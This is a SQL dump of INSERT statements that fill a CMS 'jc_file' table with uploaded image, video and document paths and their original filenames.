INSERT INTO `jc_file` VALUES ('/u/cms/www/12142734jwmh.jpg', '12142734jwmh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142735jqmu.jpg', '12142735jqmu.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142735rhib.jpg', '12142735rhib.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1214273617d5.jpg', '1214273617d5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142736ue6c.jpg', '12142736ue6c.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142737cr9y.jpg', '12142737cr9y.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142830poeb.jpg', '12142830poeb.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1214325480ue.jpg', '1214325480ue.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12143254y1wh.jpg', '12143254y1wh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121432556ttu.jpg', '121432556ttu.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12143255ryzh.jpg', '12143255ryzh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12143255ukxu.jpg', '12143255ukxu.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12143256g1bo.jpg', '12143256g1bo.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12143342sfmg.jpg', '12143342sfmg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121454345gdz.jpg', '121454345gdz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12145434959z.jpg', '12145434959z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12145434qkiz.jpg', '12145434qkiz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12145435lmi6.jpg', '12145435lmi6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12145435u9c1.jpg', '12145435u9c1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121456599tnd.jpg', '121456599tnd.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150556da16.jpg', '12150556da16.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150556inf7.jpg', '12150556inf7.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150557dzrz.jpg', '12150557dzrz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150557etcp.jpg', '12150557etcp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150701tmkd.jpg', '12150701tmkd.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150936264i.jpg', '12150936264i.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121509368460.jpg', '121509368460.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150936cnpa.jpg', '12150936cnpa.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121509371kyv.jpg', '121509371kyv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12150937xe3g.jpg', '12150937xe3g.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12151139jrv6.jpg', '12151139jrv6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1215211539ic.jpg', '1215211539ic.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12152115dymp.jpg', '12152115dymp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12152115n7ee.jpg', '12152115n7ee.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12152115oqbj.jpg', '12152115oqbj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12152116am9n.jpg', '12152116am9n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12152257va9g.jpg', '12152257va9g.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12153550461x.jpg', '12153550461x.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12153550ryso.jpg', '12153550ryso.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12153551fflz.jpg', '12153551fflz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12153551igy5.jpg', '12153551igy5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12153551r5kz.jpg', '12153551r5kz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121535526foq.jpg', '121535526foq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121536505s2h.jpg', '121536505s2h.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121542148jkc.jpg', '121542148jkc.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121542158t1n.jpg', '121542158t1n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121542159xil.jpg', '121542159xil.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154215ryyk.jpg', '12154215ryyk.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154215y02n.jpg', '12154215y02n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154216egtt.jpg', '12154216egtt.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121543059cct.jpg', '121543059cct.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154708kkn6.jpg', '12154708kkn6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154708nsye.jpg', '12154708nsye.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154708we6w.jpg', '12154708we6w.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154709iod3.jpg', '12154709iod3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12154709ypkl.jpg', '12154709ypkl.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121547582f5t.jpg', '121547582f5t.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1311420498g8.jpg', '1311420498g8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131203117zrn.jpg', '131203117zrn.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131257327chh.jpg', '131257327chh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13141220dfer.jpg', '13141220dfer.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131423399l1z.jpg', '131423399l1z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13142927kzr3.jpg', '13142927kzr3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1316285322ks.jpg', '1316285322ks.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13162904gqxm.jpg', '13162904gqxm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13162913da42.jpg', '13162913da42.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131629222u39.jpg', '131629222u39.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13162931ofsn.jpg', '13162931ofsn.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13162941ipg2.jpg', '13162941ipg2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13163101ccd3.jpg', '13163101ccd3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13163113pd3s.jpg', '13163113pd3s.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13163306pqvc.jpg', '13163306pqvc.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13165112t47d.jpg', '13165112t47d.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13165118lr7r.jpg', '13165118lr7r.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13165348xokj.jpg', '13165348xokj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131656557m43.jpg', '131656557m43.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13165702cchp.jpg', '13165702cchp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13170123ywvv.jpg', '13170123ywvv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13170129mx9q.jpg', '13170129mx9q.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13170427k084.jpg', '13170427k084.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/131706089h4w.jpg', '131706089h4w.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13170759d8ow.jpg', '13170759d8ow.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/13170940lu1h.jpg', '13170940lu1h.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19110822fin2.jpg', '19110822fin2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19112623820c.jpg', '19112623820c.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19112700bypf.jpg', '19112700bypf.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19114043tp85.jpg', '19114043tp85.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19114201tdir.jpg', '19114201tdir.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/191201449moh.jpg', '191201449moh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/191203538tdp.jpg', '191203538tdp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19131809acqm.jpg', '19131809acqm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19131949r2ge.jpg', '19131949r2ge.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/191342393mlg.jpg', '191342393mlg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19134448qvza.jpg', '19134448qvza.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/191351590e53.jpg', '191351590e53.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19135642zjak.jpg', '19135642zjak.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19135645ge7r.jpg', '19135645ge7r.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19135821ij0m.jpg', '19135821ij0m.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19140340fri2.jpg', '19140340fri2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19140601kgid.jpg', '19140601kgid.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19140803w9fg.jpg', '19140803w9fg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/191408471iyj.jpg', '191408471iyj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19141200ip5c.jpg', '19141200ip5c.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19141318apz1.jpg', '19141318apz1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19141700opui.jpg', '19141700opui.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19141756u9sa.jpg', '19141756u9sa.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142041eu8x.jpg', '19142041eu8x.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142206y73m.jpg', '19142206y73m.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142430589t.jpg', '19142430589t.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142451945q.jpg', '19142451945q.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142818yvty.jpg', '19142818yvty.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/19142840ycm6.jpg', '19142840ycm6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201139137vu6.jpg', '201139137vu6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20114003od1n.jpg', '20114003od1n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201140399nrc.jpg', '201140399nrc.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201143116bd3.jpg', '201143116bd3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20114348t1z8.jpg', '20114348t1z8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20114520rqti.jpg', '20114520rqti.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20114607jim6.jpg', '20114607jim6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20114824s9bf.jpg', '20114824s9bf.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20115532h8tv.jpg', '20115532h8tv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201159459afm.jpg', '201159459afm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20120531bbei.jpg', '20120531bbei.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/20120732ybv8.jpg', '20120732ybv8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201308', '201308', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201308//mv.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201309', '201309', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201312/301119254w80.flv', '/u/cms/www/201312/301119254w80.flv', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/08115215axo2.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/08115420e3qq.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/08115602zbpp.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/0814345226bf.png', '屏幕截图(1).png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/081435107c1f.png', 'QQ图片20150417172121.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/08143510hn5q.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/19101000895y.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/19102214sw7g.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/28153507v3si.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/28153820xz3s.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/28155213xbnf.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/28155257lfcw.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201505/28155304ool6.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/10104142j87z.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/101104049u6a.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/10110750eroe.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/101109584374.jpg', '3.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/10112023agt7.jpg', '3.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/10163704n0m7.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/10172037p56n.jpg', '3.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/271405251vsw.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/27141715ku66.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201508/271419260xl6.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08103133dosc.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08104832360a.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08105041f9xd.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/081613140y6j.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08161359pv1d.jpg', '2.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08161538j0sn.png', 'logo.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08162637wfpl.png', 'logo.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/08172019lz4w.png', 'logo.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201510/27142936gt6k.jpg', '131423399l1z.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201607/15154001xgx4.jpg', 'banner04.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201607/19141205t5d9.jpg', 'MAIN201607190815465375224112529.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201608/30174757ffr0.jpg', '255901999.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103353l0rl.png', 'small-prev-page-on.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/131035049a54.png', 'm-sj.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103723gjne.png', 'small-prev-page-on.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103724lwp5.png', 'small-next-page.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103724wi3l.png', 'small-next-page-on.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/1310372501bw.png', 'small-prev-page.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103813zfv9.png', 'member-nav.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/13103824db3u.png', 'm-sj.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19152319tjq4.png', 'zsr.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19152412hzzi.png', 'zsr.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191535032l85.png', 'zhye.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19153503qjwl.png', 'zsr.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19153920h4eu.png', 'zhye.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154055s1o7.png', 'zhye.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191544366efu.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154641z4av.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191547450q92.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19154854sed0.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155012rfja.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155535g178.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191556168oxh.png', 'zhye.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191557592avc.png', 'zsr.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155839xtw8.png', 'zhye.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191559127g8a.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19155948ohk3.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/191601382uqh.png', 'txsj.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19160214xqcz.png', 'gmcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/19160256yti4.png', 'txcs.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/23100710845n.jpg', 'sf.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/270953566xxw.jpg', 'content-bdy.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201609/27095528bd43.jpg', 'download02.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08153906dmjk.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/081540214khn.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08154224b4zl.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08155845dhts.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08160110rjjx.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/081602097gfq.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08162230t0wf.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/08162651u5t0.jpg', 'wenku_item05.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100842hqdk.jpg', 'topic_title03.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100850mssf.jpg', 'topic03.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10100951y2xy.jpg', 'topic_title02.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/1010095517rc.jpg', 'topic02.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101010021q7v.jpg', 'topic_title01.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10101006fqv3.jpg', 'topic01.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101317064t3l.jpg', 'xZ.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/110911592mxa.jpg', 'hlwjia.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/110919049wkh.jpg', 'qglh.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092148co74.jpg', 'qglh.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092540p27t.jpg', 'zph.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092701sxi4.jpg', 'zph.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111659rnpb.mp4', '/u/cms/www/201610/11111659rnpb.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111729glis.docx', '测试.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111806t1hj.mp4', '/u/cms/www/201610/11111806t1hj.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111118456g3w.docx', '测试.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111118588poy.mp4', '/u/cms/www/201610/111118588poy.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11112051yx2x.mp4', '/u/cms/www/201610/11112051yx2x.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111121133pnh.mp4', '/u/cms/www/201610/111121133pnh.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111121213xss.docx', '测试.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11112910l4qa.jpg', '3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11113157dh9e.jpg', '0.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093458gynd.jpg', '22093458gynd.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093502mmft.jpg', '22093502mmft.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093506l8pv.jpg', '22093506l8pv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093509qm3l.jpg', '22093509qm3l.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093513srmf.jpg', '22093513srmf.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094752xoxd.jpg', '22094752xoxd.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094906lrj8.jpg', '22094906lrj8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094911xe9x.jpg', '22094911xe9x.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094915t8h1.jpg', '22094915t8h1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094918gnze.jpg', '22094918gnze.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100555lytj.jpg', '22100555lytj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100558gfsb.jpg', '22100558gfsb.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100601l1us.jpg', '22100601l1us.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100606t8mw.jpg', '22100606t8mw.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100611o2gl.jpg', '22100611o2gl.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172935t4sb.jpg', '23172935t4sb.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172936acob.jpg', '23172936acob.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172937bli1.jpg', '23172937bli1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172937r23n.jpg', '23172937r23n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172939ln5a.jpg', '23172939ln5a.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/231729407e1v.jpg', '231729407e1v.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/231729434x7h.jpg', '231729434x7h.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172944o38x.jpg', '23172944o38x.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172944vvdh.jpg', '23172944vvdh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172946mzqx.jpg', '23172946mzqx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172947nrrl.jpg', '23172947nrrl.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24102446b7al.jpg', '24102446b7al.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24102503z9wj.jpg', '24102503z9wj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/2416455972ro.jpg', '2416455972ro.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/241646340nq6.jpg', '241646340nq6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24164707ksjq.jpg', '24164707ksjq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/26115537aper.jpg', '26115537aper.jpg', 1, NULL);
